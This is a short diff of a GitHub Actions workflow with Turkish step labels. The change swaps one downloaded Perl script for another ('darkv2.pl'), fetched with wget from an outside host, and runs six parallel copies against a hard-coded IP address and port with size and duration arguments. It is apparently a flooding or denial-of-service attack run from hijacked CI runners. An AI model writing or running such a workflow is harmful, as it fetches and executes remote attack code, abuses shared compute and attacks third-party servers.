@@ -16,14 +16,14 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/5mw38UO92O/dc.pl
+          wget https://wgetz.com/LDSK1ApW73/darkv2.pl
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
         run: |
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            perl dc.pl 104.29.142.103 19313 60 60 &
+            perl darkv2.pl 46.105.46.156 30001 10000 65600 S 1 &
             PIDS+=($!)
           done
           
